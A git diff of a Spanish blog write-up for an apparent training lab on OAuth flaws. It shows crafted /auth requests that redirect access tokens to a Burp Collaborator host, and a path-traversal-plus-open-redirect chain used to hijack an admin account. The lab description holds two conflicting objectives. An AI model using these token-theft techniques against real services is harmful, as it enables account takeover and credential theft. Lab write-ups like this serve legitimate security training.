@@ -24,103 +24,103 @@ image:
   
 ## Descripción
 
-Este `laboratorio` utiliza un `servicio OAuth` para permitir que los usuarios `inicien sesión` con su `cuenta de redes sociales`. Una `validación defectuosa` por parte del `servicio OAuth` hace posible que un atacante `filtre tokens de acceso` hacia `páginas arbitrarias` en la `aplicación cliente`
+Este laboratorio utiliza un servicio OAuth para permitir que los usuarios `inicien sesión con su cuenta de redes sociales`. Una `validación defectuosa por parte del servicio OAuth hace posible que un atacante filtre tokens de acceso hacia páginas arbitrarias en la aplicación cliente`
 
-Para `resolver` el `laboratorio`, debemos identificar un `open redirect` en el `sitio web` y usarla para `robar un token de acceso` de la cuenta del usuario `admin`. Luego, debemos usar el `token de acceso` para `obtener` la `clave API del administrador` y `enviar la solución` utilizando el `botón proporcionado` en el `banner del laboratorio`
+Para resolver el laboratorio, debemos identificar un open redirect en el sitio web y usarla para robar un token de acceso de la cuenta del usuario admin. Luego, debemos usar el token de acceso para obtener la clave API del administrador y `enviar la solución utilizando el botón proporcionado en el banner del laboratorio`
 
-Para `resolver` el `laboratorio`, debemos `robar un código de autorización` asociado al usuario `admin`, `usarlo para acceder a su cuenta` y `eliminar al usuario carlos`
+Para resolver el laboratorio, debemos `robar un código de autorización asociado al usuario admin`, usarlo para acceder a su cuenta y eliminar al usuario carlos
 
-El usuario `admin` abrirá cualquier cosa que enviemos desde el `servidor de explotación` y siempre tiene una `sesión activa` con el `servicio OAuth`. Podemos `iniciar sesión` con nuestra propia `cuenta de redes sociales` utilizando las credenciales `wiener:peter`
+El usuario admin abrirá cualquier cosa que enviemos desde el `servidor de explotación y siempre tiene una sesión activa con el servicio OAuth`. Podemos `iniciar sesión con nuestra propia cuenta de redes sociales utilizando las credenciales wiener:peter`
 
 ---
 
 ## Guía de vulnerabilidades de OAuth
 
-`Antes` de `completar` este `laboratorio` es recomendable `leerse` esta `guía de vulnerabilidades de OAuth` [https://justice-reaper.github.io/posts/OAuth-Vulnerabilities-Guide/](https://justice-reaper.github.io/posts/OAuth-Vulnerabilities-Guide/)
+Antes de completar este laboratorio es recomendable leerse esta `guía de vulnerabilidades de OAuth` [https://justice-reaper.github.io/posts/OAuth-Vulnerabilities-Guide/](https://justice-reaper.github.io/posts/OAuth-Vulnerabilities-Guide/)
 
 ## Resolución
 
-Al `acceder` a la `web` vemos esto
+Al acceder a la web vemos esto
 
 ![](/assets/img/OAuth-Vulnerabilities-Lab-5/image_1.png)
 
-Si pulsamos sobre `View post` vemos que podemos `comentar` en el `post`
+Si pulsamos sobre View post vemos que podemos comentar en el post
 
 ![](/assets/img/OAuth-Vulnerabilities-Lab-5/image_2.png)
 
-Si pulsamos sobre `My account` nos `redirige` al `panel de login`
+Si pulsamos sobre My account nos redirige al panel de login
 
 ![](/assets/img/OAuth-Vulnerabilities-Lab-5/image_3.png)
 
-No `logueamos` con las credenciales `wiener:peter`
+No logueamos con las credenciales `wiener:peter`
 
 ![](/assets/img/OAuth-Vulnerabilities-Lab-5/image_4.png)
 
-Posteriormente nos `redirige` a esta otra ventana donde nos `solicita permiso` para `acceder` a nuestro `perfil` e `email`
+Posteriormente nos redirige a esta otra ventana donde nos solicita permiso para acceder a nuestro perfil e email
 
 ![](/assets/img/OAuth-Vulnerabilities-Lab-5/image_5.png)
 
-Si hemos `iniciado sesión` correctamente nos saldrá este `mensaje` al `final`
+Si hemos `iniciado sesión` correctamente nos saldrá este mensaje al final
 
 ![](/assets/img/OAuth-Vulnerabilities-Lab-5/image_6.png)
 
-Si `accedemos` a `My account` veremos nuestro `username`, nuestro `email` y nuestra `API Key` pero `oculta`
+Si accedemos a My account veremos nuestro username, nuestro email y nuestra API Key pero oculta
 
 ![](/assets/img/OAuth-Vulnerabilities-Lab-5/image_7.png)
 
-Si nos dirigimos a la extensión `Logger ++` de `Burpsuite` vemos todo el `flujo de peticiones`
+Si nos dirigimos a la extensión `Logger ++ de Burpsuite vemos todo el flujo de peticiones`
 
 ![](/assets/img/OAuth-Vulnerabilities-Lab-5/image_8.png)
 
-Podemos determinar el `grant type` observando la petición a `/auth`. En este caso el parámetro `response_type` tiene el valor `token` lo cual quiere decir que estamos ante un `implicit grant type`. Además de esto también podemos ver el `nombre de host` del `servidor de autorización`, en este caso es `0aa200df04b772bf80a5030300d90002.web-security-academy.net`
+Podemos determinar el grant type observando la petición a `/auth`. En este caso el parámetro `response_type tiene el valor token lo cual quiere decir que estamos ante un implicit grant type`. Además de esto también podemos ver el nombre de host del `servidor de autorización`, en este caso es `0aa200df04b772bf80a5030300d90002.web-security-academy.net`
 
 ![](/assets/img/OAuth-Vulnerabilities-Lab-5/image_9.png)
 
-Si nos fijamos bien el `access_token` que obtenemos es el `token Bearer` que utilizamos al `realizar` la `petición` al endpoint `/me` para `obtener` los `datos de nuestro usuario`
+Si nos fijamos bien el `access_token que obtenemos es el token Bearer que utilizamos al realizar la petición al endpoint /me para obtener los datos de nuestro usuario`
 
 ![](/assets/img/OAuth-Vulnerabilities-Lab-5/image_10.png)
 
-He intentado `reemplazar` el `redirect_uri` con nuestro `domino` de `Burpsuite Collaborator` pero `no ha dado resultado` y nos ha devuelto un `400 Bad Request`
+He intentado reemplazar el `redirect_uri con nuestro domino de Burpsuite Collaborator pero no ha dado resultado y nos ha devuelto un 400 Bad Request`
 
 ```
 /auth?client_id=vo9u2pwawi2repjyjf7vh&redirect_uri=https://wjjpjasy2f9kk4accv65927r3i99xzlo.oastify.com&response_type=token&nonce=-586290821&scope=openid%20profile%20email
 ```
 
-He intentado bypassear el dominio `https://0aa200df04b772bf80a5030300d90002.web-security-academy.net/oauth-callback` y hacer que la `redirección` se haga a mi dominio de `Burpsuite Collaborator` pero `tampoco ha dado resultado`
+He intentado bypassear el dominio `https://0aa200df04b772bf80a5030300d90002.web-security-academy.net/oauth-callback y hacer que la redirección se haga a mi dominio de Burpsuite Collaborator pero tampoco ha dado resultado`
 
 ```
 /auth?client_id=vo9u2pwawi2repjyjf7vh&redirect_uri=https://0aa200df04b772bf80a5030300d90002.web-security-academy.net/oauth-callback@https://wjjpjasy2f9kk4accv65927r3i99xzlo.oastify.com&response_type=token&nonce=-586290821&scope=openid%20profile%20email
 ```
 
-He intentado llevar a cabo un `parameter pollution` añadiendo `redirect_uri=https://wjjpjasy2f9kk4accv65927r3i99xzlo.oastify.com` al final de la URL pero `no ha funcionado`
+He intentado llevar a cabo un parameter pollution añadiendo `redirect_uri=https://wjjpjasy2f9kk4accv65927r3i99xzlo.oastify.com al final de la URL pero no ha funcionado`
 
 ```
 /auth?client_id=vo9u2pwawi2repjyjf7vh&redirect_uri=https://0aa200df04b772bf80a5030300d90002.web-security-academy.net/oauth-callback&response_type=token&nonce=-586290821&scope=openid%20profile%20email&redirect_uri=https://wjjpjasy2f9kk4accv65927r3i99xzlo.oastify.com
 ```
 
-He probado un `path traversal` y en este caso `sí ha funcionado`
+He probado un path traversal y en este caso `sí ha funcionado`
 
 ```
 /auth?client_id=vo9u2pwawi2repjyjf7vh&redirect_uri=https://0aa200df04b772bf80a5030300d90002.web-security-academy.net/oauth-callback/../&response_type=token&nonce=-586290821&scope=openid%20profile%20email
 ```
 
-Podemos ver como si `no hacemos el path traversal` nos `redirige` a `https://0aa200df04b772bf80a5030300d90002.web-security-academy.net/oauth-callback#access_token=7_zqOzYjOwqjx9p4q89vMQ1OerjxHZNZQknryzCZeLs&amp;expires_in=3600&amp;token_type=Bearer&amp;scope=openid%20profile%20email`
+Podemos ver como si no hacemos el path traversal nos redirige a `https://0aa200df04b772bf80a5030300d90002.web-security-academy.net/oauth-callback#access_token=7_zqOzYjOwqjx9p4q89vMQ1OerjxHZNZQknryzCZeLs&amp;expires_in=3600&amp;token_type=Bearer&amp;scope=openid%20profile%20email`
 
 ![](/assets/img/OAuth-Vulnerabilities-Lab-5/image_11.png)
 
-Sin embargo, `si efectuamos el path traversal` nos `redirige` a `https://0aa200df04b772bf80a5030300d90002.web-security-academy.net/#access_token=VS0YNG681SR-PwP8nn2hBp5ptfo8KmfunnG3Qpq1C9W&amp;expires_in=3600&amp;token_type=Bearer&amp;scope=openid%20profile%20email`
+Sin embargo, si efectuamos el path traversal nos redirige a `https://0aa200df04b772bf80a5030300d90002.web-security-academy.net/#access_token=VS0YNG681SR-PwP8nn2hBp5ptfo8KmfunnG3Qpq1C9W&amp;expires_in=3600&amp;token_type=Bearer&amp;scope=openid%20profile%20email`
 
 ![](/assets/img/OAuth-Vulnerabilities-Lab-5/image_12.png)
 
-Tenemos el `path traversal` pero tenemos que `combinarlo` con un `open redirect` para que nos `envíe` el `access_token` a nuestro `servidor`. He he dado cuenta que si pulsamos sobre `View post > next page` nos muestra una ruta interesante
+Tenemos el path traversal pero tenemos que combinarlo con un open redirect para que nos `envíe el access_token a nuestro servidor`. He he dado cuenta que si pulsamos sobre `View post > next page` nos muestra una ruta interesante
 
 ![](/assets/img/OAuth-Vulnerabilities-Lab-5/image_13.png)
 
-Si `capturamos` la `petición` con `Burpsuite` y como `path` ponemos nuestro `dominio` de `Burpsuite Collaborator` vemos que funciona
+Si capturamos la `petición con Burpsuite y como path ponemos nuestro dominio de Burpsuite Collaborator` vemos que funciona
 
 ![](/assets/img/OAuth-Vulnerabilities-Lab-5/image_14.png)
 
-Ahora que tenemos un `path traversal` y un `open redirect`, podemos `combinar ambas vulnerabilidades` para `obtener` el `access_token` en nuestro `servidor`. Para ello, nos dirigimos al `Exploit server` y `construimos` este `payload`
+Ahora que tenemos un path traversal y un open redirect, podemos combinar ambas vulnerabilidades para obtener el `access_token en nuestro servidor`. Para ello, nos dirigimos al Exploit server y construimos este payload
 
 ```
 <script>
@@ -134,15 +134,15 @@ Ahora que tenemos un `path traversal` y un `open redirect`, podemos `combinar am
 
 ![](/assets/img/OAuth-Vulnerabilities-Lab-5/image_15.png)
 
-Una vez hecho esto pulsamos sobre `Deliver exploit to victim` y posteriormente en `Access log`
+Una vez hecho esto pulsamos sobre Deliver exploit to victim y posteriormente en Access log
 
 ![](/assets/img/OAuth-Vulnerabilities-Lab-5/image_16.png)
 
-Una vez tenemos el `access_token` lo sustituimos en la cabecera `Authorization`
+Una vez tenemos el `access_token lo sustituimos en la cabecera Authorization`
 
 ![](/assets/img/OAuth-Vulnerabilities-Lab-5/image_17.png)
 
-Si queremos `acceder` a la `cuenta de administrador` debemos `copiarnos` el `nombre de usuario`, el `access_token` y el `email`
+Si queremos acceder a la cuenta de administrador debemos copiarnos el nombre de usuario, el `access_token y el email`
 
 ![](/assets/img/OAuth-Vulnerabilities-Lab-5/image_18.png)
 
@@ -150,10 +150,10 @@ Pulsamos `click derecho > Request in browser > In original session`
 
 ![](/assets/img/OAuth-Vulnerabilities-Lab-5/image_19.png)
 
-`Copiamos` la `URL` en el `navegador` y ya podemos `acceder` a la `cuenta del usuario administrador`
+Copiamos la URL en el navegador y ya podemos acceder a la cuenta del usuario administrador
 
 ![](/assets/img/OAuth-Vulnerabilities-Lab-5/image_20.png)
 
-Para `resolver` el `laboratorio` tenemos pulsar sobre `Submit solution` y `pegar` ahí la `apiKey`
+Para resolver el laboratorio tenemos pulsar sobre Submit solution y pegar ahí la apiKey
 
 ![](/assets/img/OAuth-Vulnerabilities-Lab-5/image_21.png)
